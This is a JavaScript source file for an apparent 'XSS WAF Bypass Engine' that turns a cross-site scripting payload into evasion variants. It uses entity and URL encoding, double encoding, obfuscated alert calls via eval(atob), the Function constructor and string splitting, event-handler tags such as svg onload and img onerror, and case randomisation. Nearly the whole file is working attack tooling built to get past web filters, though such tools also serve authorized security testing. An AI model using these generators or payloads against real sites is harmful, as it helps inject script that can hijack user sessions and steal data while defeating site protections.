/**
 * XSS WAF Bypass Engine
 * Generates multiple evasion variants for XSS payloads.
 * Supports: HTML Context, JS Context, Attribute Context
 */

import { urlEncode, htmlHexEncode, htmlDecimalEncode, randomCase, jsUnicodeEscape } from '../utils/encoding'
import { pickOne, shuffle } from '../utils/helpers'

/* ── HTML Entity Encoding ─────────────────────────── */
function applyHtmlEntities(payload) {
  const variants = []
  // Hex entities
  variants.push(htmlHexEncode(payload))
  // Decimal entities
  variants.push(htmlDecimalEncode(payload))
  // Partial encoding — only encode < > " '
  const partial = payload
    .replace(/</g, '&#x3C;')
    .replace(/>/g, '&#x3E;')
    .replace(/"/g, '&#x22;')
    .replace(/'/g, '&#x27;')
  variants.push(partial)
  // Mixed hex/decimal
  const mixed = Array.from(payload)
    .map(c => Math.random() > 0.5
      ? '&#x' + c.charCodeAt(0).toString(16).toUpperCase() + ';'
      : '&#' + c.charCodeAt(0) + ';'
    ).join('')
  variants.push(mixed)
  return variants
}

/* ── URL Encoding ─────────────────────────────────── */
function applyUrlEncoding(payload) {
  const variants = []
  variants.push(urlEncode(payload))
  // Only encode special chars
  const partial = payload
    .replace(/</g, '%3C')
    .replace(/>/g, '%3E')
    .replace(/"/g, '%22')
    .replace(/'/g, '%27')
    .replace(/\(/g, '%28')
    .replace(/\)/g, '%29')
  variants.push(partial)
  return variants
}

/* ── JS Function Obfuscation ─────────────────────── */
function applyJsObfuscation(payload) {
  const variants = []

  // window['al'+'ert'](1)
  variants.push(payload.replace(/alert\s*\(([^)]*)\)/g, "window['al'+'ert']($1)"))

  // self['al'+'ert'](1)
  variants.push(payload.replace(/alert\s*\(([^)]*)\)/g, "self['al'+'ert']($1)"))

  // top['al'+'ert'](1)
  variants.push(payload.replace(/alert\s*\(([^)]*)\)/g, "top['al'+'ert']($1)"))

  // Function constructor
  variants.push(payload.replace(/alert\s*\(([^)]*)\)/g, "Function('al'+'ert($1)')()"))

  // eval + atob
  const alertMatch = payload.match(/alert\s*\(([^)]*)\)/)
  if (alertMatch) {
    const b64 = btoa(`alert(${alertMatch[1]})`)
    variants.push(payload.replace(/alert\s*\([^)]*\)/, `eval(atob('${b64}'))`))
  }

  // setTimeout variant
  variants.push(payload.replace(/alert\s*\(([^)]*)\)/g, "setTimeout('al'+'ert($1)',0)"))

  // String.fromCharCode
  const alertStr = 'alert'
  const charCodes = Array.from(alertStr).map(c => c.charCodeAt(0)).join(',')
  variants.push(payload.replace(/alert/g, `[].constructor.constructor('return this')()['\\x61\\x6c\\x65\\x72\\x74']`))

  return variants.filter(v => v !== payload)
}

/* ── Tag & Event Variation ────────────────────────── */
function applyTagVariation(payload) {
  const variants = []

  // Extract the JS expression from the payload
  const jsMatch = payload.match(/<script[^>]*>(.*?)<\/script>/is)
  const jsCode = jsMatch ? jsMatch[1] : 'alert(1)'

  // svg/onload
  variants.push(`<svg/onload=${jsCode}>`)
  variants.push(`<svg onload=${jsCode}>`)

  // img/onerror
  variants.push(`<img src=x onerror=${jsCode}>`)
  variants.push(`<img/src=x/onerror=${jsCode}>`)

  // body/onload
  variants.push(`<body onload=${jsCode}>`)
  variants.push(`<body onpageshow=${jsCode}>`)

  // details/ontoggle
  variants.push(`<details open ontoggle=${jsCode}>`)

  // iframe/onload
  variants.push(`<iframe/onload=${jsCode}>`)

  // input/onfocus + autofocus
  variants.push(`<input onfocus=${jsCode} autofocus>`)
  variants.push(`<input/onfocus=${jsCode}/autofocus>`)

  // marquee
  variants.push(`<marquee onstart=${jsCode}>`)

  // video/source onerror
  variants.push(`<video><source onerror=${jsCode}>`)

  // math
  variants.push(`<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d="M0 0"/><animate attributeName=d values="M0 0" begin="x.click" fill="freeze"/><set attributeName=onclick to=${jsCode} begin="x.click"/>`)

  return variants
}

/* ── Case Toggling for XSS ────────────────────────── */
function applyCaseToggle(payload) {
  const variants = []
  for (let i = 0; i < 3; i++) {
    // Randomize case of tag names and event handlers
    let result = payload
    result = result.replace(/<\/?(\w+)/g, (m, tag) => m.replace(tag, randomCase(tag)))
    result = result.replace(/on(\w+)\s*=/gi, (m, event) => 'on' + randomCase(event) + '=')
    variants.push(result)
  }
  return variants
}

/* ── Mixed Encoding ───────────────────────────────── */
function applyEncodingMix(payload) {
  const variants = []

  // HTML entities + JS unicode for function names
  let v1 = payload
    .replace(/</g, '&#x3C;')
    .replace(/>/g, '&#x3E;')
  v1 = v1.replace(/alert/g, jsUnicodeEscape('alert'))
  variants.push(v1)

  // URL encode tags, HTML encode JS
  let v2 = payload
    .replace(/</g, '%3C')
    .replace(/>/g, '%3E')
    .replace(/alert/g, '&#x61;&#x6C;&#x65;&#x72;&#x74;')
  variants.push(v2)

  // Double encode angle brackets
  let v3 = payload
    .replace(/</g, '%253C')
    .replace(/>/g, '%253E')
  variants.push(v3)

  // JS hex escapes inside event handlers
  let v4 = payload.replace(/alert\s*\(([^)]*)\)/g, '\\x61\\x6c\\x65\\x72\\x74($1)')
  variants.push(v4)

  return variants
}

/* ── Main Engine ─────────────────────────────────── */
export function generateXssVariants(payload, layers, target) {
  if (!payload || !payload.trim()) return []

  const allVariants = []
  allVariants.push({ payload, label: 'Original', layers: [] })

  if (layers.includes('html-entities')) {
    applyHtmlEntities(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'HTML Entities', layers: ['html-entities'] })
    })
  }

  if (layers.includes('url-encoding')) {
    applyUrlEncoding(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'URL Encoding', layers: ['url-encoding'] })
    })
  }

  if (layers.includes('js-obfuscation')) {
    applyJsObfuscation(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'JS Obfuscation', layers: ['js-obfuscation'] })
    })
  }

  if (layers.includes('tag-variation')) {
    applyTagVariation(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Tag Variation', layers: ['tag-variation'] })
    })
  }

  if (layers.includes('case-toggle')) {
    applyCaseToggle(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Case Toggle', layers: ['case-toggle'] })
    })
  }

  if (layers.includes('encoding-mix')) {
    applyEncodingMix(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Mixed Encoding', layers: ['encoding-mix'] })
    })
  }

  // Combos
  if (layers.length >= 2) {
    if (layers.includes('tag-variation') && layers.includes('case-toggle')) {
      applyTagVariation(payload).slice(0, 3).forEach(tv => {
        const cased = randomCase(tv)
        allVariants.push({ payload: cased, label: 'Tag + Case', layers: ['tag-variation', 'case-toggle'] })
      })
    }

    if (layers.includes('tag-variation') && layers.includes('url-encoding')) {
      applyTagVariation(payload).slice(0, 2).forEach(tv => {
        const encoded = tv.replace(/</g, '%3C').replace(/>/g, '%3E').replace(/"/g, '%22')
        allVariants.push({ payload: encoded, label: 'Tag + URL', layers: ['tag-variation', 'url-encoding'] })
      })
    }
  }

  // Deduplicate
  const seen = new Set()
  const unique = allVariants.filter(v => {
    if (seen.has(v.payload)) return false
    seen.add(v.payload)
    return true
  })

  return unique.slice(0, 12)
}
